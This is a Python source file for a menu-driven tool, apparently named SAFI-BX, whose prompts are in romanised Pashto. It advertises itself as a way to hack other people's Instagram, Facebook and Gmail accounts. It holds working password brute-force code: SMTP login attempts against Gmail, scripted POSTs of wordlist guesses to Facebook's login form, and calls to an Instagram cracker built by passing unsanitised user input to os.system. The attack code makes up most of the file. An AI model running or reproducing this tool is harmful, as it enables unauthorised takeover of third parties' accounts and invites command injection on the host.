# /bin/python !
# https://github.com/Safi4non

from __future__ import absolute_import
from __future__ import print_function
import time
import os
import threading
import sys
import requests
from bs4 import BeautifulSoup
import smtplib
from time import sleep

passs = ('''
\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mKM YO ZAAT PASSWORD ACHAY PKAY:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m ZMA WALA PASS LIST
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m KHPL PASS LIST
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m SHATA LAAAR SHA
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m OZA TAY NA

\033[1;91mSAFI-BX\033[1;97m>>\033[1;92m ''')

main_menu = ('''
\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA SA ID HACK KAY:

\033[1;91m[\033[1;97m1\033[1;91m]\033[1;92m Instagram
\033[1;91m[\033[1;97m2\033[1;91m]\033[1;92m Facebook
\033[1;91m[\033[1;97m3\033[1;91m]\033[1;92m E-mail
\033[1;91m[\033[1;97m4\033[1;91m]\033[1;92m DA DAY TOOL PA BARA KAY INFO
\033[1;91m[\033[1;97m5\033[1;91m]\033[1;92m MONG SA MILOW SHAY
\033[1;91m[\033[1;97m0\033[1;91m]\033[1;92m OZA TAY NA

\033[1;91mSAFI-BX\033[1;97m>>\033[1;92m ''')

banr = ("""\033[1;92m _________   _____  ___________.___         ______________  ___
 /   _____/  /  _  \ \_   _____/|   |        \______   \   \/  /
 \_____  \  /  /_\  \ |    __)  |   |  ______ |    |  _/\     / 
 /        \/    |    \|     \   |   | /_____/ |    |   \/     \ 
/_______  /\____|__  /\___  /   |___|         |______  /___/\  \
        \/         \/     \/                         \/      \_/
\033[1;91m<═══\033[1;41m\033[1;97m Created by Safi4non \033[;0m\033[1;91m═══>\033[1;92m""")

about = ("""\033[1;91m[\033[1;97m?\033[1;91m] \033[1;92mSAFI-BX Introduction:

\033[1;97m➤ \033[1;92mDA SAFI-BX YO DASAY TOOL DAY 6 DA KM PA XREYA TASO DA FB INSTA GMAIL ID PA ASANAY SA HACK KWLAY SHAY ASAL DAY K DASAY TREEKA E KNA 6 PDAY 6 BESHUMARA  PASSWORDS E AW PA AGHAY YO YO TRY KEGI 6 KLA SM PASSWORD PKAY RASHI NU AUTOMATIC PA KHPALA WADRIGI

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA SAFI-BX KHAASYAT:

\033[1;97m➤ \033[1;92mTA SO PAY DA HR CHA FB INSTAGRAM GMAIL ID HACK KWALAY SHAY 100 PASSWORD PA SECOND KAY. KA TASO S KHPL PASSWORD LIST NA E NU BAYGHAMA SHA PDAY TOOL KAY KHPL PASSWORD LIST SHTA NU TENSION BA NA AKHLAY). 

\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m ZMA PA BARA K:

\033[1;97m➤ \033[1;92mDA TOOL Safi4non JOOR KRAY DAY
\033[1;92m""")

soc = """\033[1;91m[\033[;1;97m01\033[1;91m] \033[1;92mYo OPTION PKAY MUNTAKHIB KAY

\033[1;91m[\033[;1;97m01\033[1;91m] \033[1;92mInstagram
\033[1;91m[\033[;1;97m02\033[1;91m] \033[1;92mFacebook
\033[1;91m[\033[;1;97m03\033[1;91m] \033[1;92mGithub
\033[1;91m[\033[;1;97m04\033[1;91m] \033[1;92mYouTube
\033[1;91m[\033[;1;97m05\033[1;91m] \033[1;92mTelegram
\033[1;91m[\033[;1;97m99\033[1;91m] \033[1;92mSHATA LAAAR SHA
\033[1;91m[00] \033[1;91mOZA TAY NA

\033[1;97m[\033[1;91m??\033[1;97m] \033[1;91mSAFI-BX>> \033[1;92m"""

def hackmail():
	class GmailBruteForce():
	    def __init__(self):
	        self.accounts = []
	        self.passwords = []
	        self.init_smtplib()
	
	    def get_pass_list(self,path):
	        file = open(path, 'r',encoding='utf8').read().splitlines()
	        for line in file:
	            self.passwords.append(line)
	
	    def init_smtplib(self):
	        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
	        self.smtp.starttls()
	        self.smtp.ehlo()
	    
	    def try_gmail(self):
	
	        for user in self.accounts:
	            for password in self.passwords:
	                try:
	                    self.smtp.login(user,password)
	                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
	                    self.smtp.quit()
	                    self.init_smtplib()
	                    break;
	                except smtplib.SMTPAuthenticationError:
	
	                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
	
	instance = GmailBruteForce()
	
	headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
	
	instance.accounts.append(usr)
	instance.get_pass_list(passlist)
	
	instance.try_gmail()

def hackbook():
	if sys.version_info[0] !=3: 
		sys.exit()
	
	post_url='https://www.facebook.com/login.php'
	headers = {
		'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
	}
	payload={}
	cookie={}
	
	def create_form():
		form=dict()
		cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
	
		data=requests.get(post_url,headers=headers)
		for i in data.cookies:
			cookie[i.name]=i.value
		data=BeautifulSoup(data.text,'html.parser').form
		if data.input['name']=='lsd':
			form['lsd']=data.input['value']
		return (form,cookie)
	
	def function(email,passw,i):
		global payload,cookie
		if i%10==1:
			payload,cookie=create_form()
			payload['email']=email
		payload['pass']=passw
		r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
		if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
			open('temp','w').write(str(r.content))
			print('\npassword is : ',passw)
			return True
		return False
	
	file=open(passlist,'r')
	
	print("\nDA TARGET ID PKAY WA CHWA:",usr)
	print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92mPASSWORD TRY KWL SHORO SHO.... " , '\033[1;91m', '\n' )
	
	i=0
	while file:
		passw=file.readline().strip()
		i+=1
		if len(passw) < 6:
			continue
		print(str(i) +" : ",passw)
		if function(usr,passw,i):
			break



# main script start
os.system("xdg-open https://youtube.com/@nkfabricsak")
time.sleep(5)

while True:
	os.system('clear')
	print(banr)
	menu = input(main_menu)
	if menu == '01' or menu == '1':
		print('\n\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m BL SESSION KOLAW KA AW tor CMND PKAY WA CHA WAY') 
		sleep(1)
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target username:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m RORA DA USERNAME HM PEDA NAKO SORRY\n')
			else:
				break
			
		while True:
			pas = input(passs)
			if pas == '01' or pas == '1':
				print()
				os.system("instagram-py --username " + usr + " --password-list .pass.txt")
				input("\033[1;94mENTER BUTTONA DBA O KAY")
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA PASSWORD LIST LOCATION PKAY WA CHA WAY: \033[1;97m')
				os.system("instagram-py --username " + usr + " --password-list " + passlist)
				input("\033[1;94mDA ENTER BUTTONA DBA O KAY")
				break
			elif pas == '3' or pas == '03':
				break
			elif pas == '0' or pas == '00':
				exit()
				
	elif menu == '02' or menu == '2':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA TARGET USER ID WA CHWA:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m USER ID HM PEDA NKRA SORRY....')
			else:
				break
		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA CHWA')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA PASSWORD LIST LOCATION PKAY WA CHA WA:\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA CHA WA')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m GHLT')
		hackbook()
		input("\033[1;94mDA ENTER BUTTONA DBA O KAY")
		
	elif menu == '03' or menu == '3':
		while True:
			usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA TARGET EMAIL ID WA CHA WA:\033[1;97m ')
			if usr == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Email ID HM PEDA NKRA')
			else:
				break

		while True:
			pas = input(passs)
			if pas == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA CHA WAY\n')
			elif pas == '01' or pas == '1':
				print()
				passlist = '.pass.txt'
				break
			elif pas == '02' or pas == '2':
				print()
				passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m DA PASSWORD LIST LOCATION :\033[1;97m ')
				if passlist == '':
					print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA CHA  WAY')
				else:
					break
			elif pas == '03' or pas == '3':
				print()
				break
			elif pas == '0' or pas == '00':
				print()
				exit()
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m GHALT')

		hackmail()
		input("\033[1;94mDA ENTER BUTTONA DBA O KAY")

	elif menu == '4' or menu == '04':
		print()
		print(about)
		while True:
			a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m TA SO MAIN MENU TA TLAL GHWARAY\033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m:\033[1;97m ')
			if a == 'y' or a == 'Y':
				break
			elif a == 'n' or a == 'N':
				exit()
			elif a == '':
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA  CHA WAY')
				sleep(1)
			else:
				print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m GHALT')
				sleep(1)

	elif menu == '5' or menu == '05':
		os.system("clear")
		print(banr)
		print()
		print("\033[1;91m[\033[;1;97m~\033[1;91m] \033[1;92mTA SO DERA MANANA 6 ZMA TOOL HM USE TO'. TA SO MA FOLLOW KWALAY SHAY'. LAANDAY PKAY OPTION CHOOSE KWLAY SHAY'. ")
		print()
		print()
		while True:
			fol = input(soc)
			if fol == '1' or fol == '01':
				print()
				print("\033[1;91m[*] \033[1;97mZMA DA INSTAGRAM ID KOLA E GI TASO PA MBL KAY\n")
				time.sleep(1)
				os.system("xdg-open https://instagram.com/muneebkhan7864")
            
			elif fol == '2' or fol == '02':
				print()
				print("\033[1;91m[*] \033[1;97mZMA DA FACEBOOK ID TASO PA MBL KAY KOLA E GI\n")
				time.sleep(1)
				os.system("xdg-open https://www.facebook.com/profile.php?id=100073444733350&mibextid=ZbWKwL")

			elif fol == '3' or fol == '03':
				print()
				print("\033[1;91m[*] \033[1;97mZMA DA GITHUB ID TASO PA MBL KAY KOLA E GI\n")
				time.sleep(1)
				os.system("xdg-open https://github.com/Safi4non")

			elif fol == '4' or fol == '04':
				print()
				print("\033[1;91m[*] \033[1;97mZMA DA YOUTUBE CHANNEL TASO PA MBL KAY KOLA E GI\n")
				time.sleep(1)
				os.system("xdg-open https://youtube.com/@nkfabricsak")
			
            
			elif fol == '5' or fol == '05':
				print()
				print("\033[1;91m[*] \033[1;97mZMA DA TELEGRAM CHANNEL TASO PA MBL KAY KOLA E GI\n")
				time.sleep(1)
				os.system("xdg-open https://t.me/bkhtKHacker")

			elif fol == '9' or fol == '99':
				print()
				print("\033[1;91m[*]\033[1;92m SHATA RAWAAAN YO..\n")
				time.sleep(1)
				break

			elif fol == '0' or fol == '00':
				print()
				exit()

			elif fol == '':
				print()
				print('SA KHO PKAY WA CHA WA') 
				print()

			else:
				print()
				print("\033[1;91mGHALT")
				print()

	elif menu == '00' or menu == '0':
		print()
		exit()
	elif menu == '':
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m SA KHO PKAY WA CHA WA') 
		sleep(1)
	else:
		print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
		sleep(1)


